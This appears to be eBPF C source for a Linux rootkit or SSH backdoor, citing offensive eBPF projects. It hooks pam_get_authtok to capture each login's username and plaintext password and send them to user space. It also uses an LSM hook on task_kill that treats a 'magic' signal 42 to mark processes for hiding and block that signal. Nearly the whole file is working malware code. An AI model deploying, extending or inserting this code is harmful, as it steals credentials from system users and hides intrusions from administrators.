/* SPDX-License-Identifier: GPL-2.0 */
#include "vmlinux.h"
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_endian.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <linux/errno.h>

// references:
// https://github.com/pathtofile/bad-bpf/tree/main
// https://github.com/Esonhugh/sshd_backdoor/tree/Skyworship
// https://github.com/bfengj/eBPFeXPLOIT
extern int bpf_strstr(const char *s1__ign, const char *s2__ign) __ksym __weak;
#include "event.h"
#include "hide.h"
#include "sshBackdoor.h"
#include "utils.h"
// SEC("uprobe/pam_get_authtok")
SEC("uprobe//usr/lib/libpam.so.0:pam_get_authtok")
int BPF_KPROBE(AuthtokEnter, struct pam_handle *pamh, int item,
               const char **authtok, const char *promt) {
  pid_t pid = bpf_get_current_pid_tgid() >> 32;

  bpf_printk("new PAM connection! %d\n", pid);
  bpf_map_update_elem(&pamHandleMap, &pid, &pamh, BPF_ANY);
  bpf_map_update_elem(&authtokMap, &pid, &authtok,
                      BPF_ANY); // start tracking pam

  return 0;
}
struct openat_args {
  const char *filename;
};

SEC("uretprobe//usr/lib/libpam.so.0:pam_get_authtok")
int BPF_KRETPROBE(AuthtokExist, int ret) {
  pid_t pid = bpf_get_current_pid_tgid() >> 32;
  pam_handle_t **pamHandlePtr = bpf_map_lookup_elem(&pamHandleMap, &pid);
  if (pamHandlePtr == 0)
    return 0;
  char ***authtokPtr = bpf_map_lookup_elem(&authtokMap, &pid);
  if (authtokPtr == 0)
    return 0;
  struct pam_handle *pamh = NULL;
  char **authtok = NULL;
  pamh = *pamHandlePtr;
  authtok = *authtokPtr;
  if (pamh == NULL || authtok == NULL)
    return 0;
  char *userPtr = NULL;
  char *passPtr = NULL;
  struct sshUserPass *sshUserPass;
  sshUserPass = bpf_ringbuf_reserve(&rb, sizeof(*sshUserPass), 0);
  if (!sshUserPass) {
    bpf_map_delete_elem(&pamHandleMap, &pid);
    bpf_map_delete_elem(&authtokMap, &pid);
    return 0;
  }
  sshUserPass->type = 2;
  bpf_probe_read_user(&userPtr, sizeof(userPtr), &pamh->user);
  bpf_probe_read_user_str(&sshUserPass->username, MAX_USERNAME_LEN, userPtr);
  bpf_probe_read_user(&passPtr, sizeof(passPtr), authtok);
  bpf_probe_read_user_str(&sshUserPass->password, MAX_PASSWORD_LEN, passPtr);
  bpf_ringbuf_submit(sshUserPass, 0);
  bpf_map_delete_elem(&pamHandleMap, &pid);
  bpf_map_delete_elem(&authtokMap, &pid);
  bpf_printk("captured credentials!\n");
  return 0;
}
struct process_event {
  __u32 pid;
  char comm[TASK_COMM_LEN];
};

///////////////////
#define MAX_PIDS_TO_HIDE 20
struct {
  __uint(type, BPF_MAP_TYPE_HASH);
  __uint(max_entries, MAX_PIDS_TO_HIDE);
  __type(key, __u32);
  __type(value, pid_t);
} pidToHideMap SEC(".maps");
__u32 index_pids = 0;
#define MAGIC 42

SEC("lsm/task_kill") // temporary for POC
int BPF_PROG(avoidKill, struct task_struct *p, struct kernel_siginfo *info,
             int sig, const struct cred *cred) {
  if (sig == MAGIC) {
    pid_t target_pid = BPF_CORE_READ(p, tgid);
    bpf_map_update_elem(&pidToHideMap, &index_pids, &target_pid, BPF_ANY);
    index_pids++;
    bpf_printk("magic!!!\n");
    return -EPERM;
  }
  return 0;
}

// shit for hiding processes

char LICENSE[] SEC("license") = "GPL";
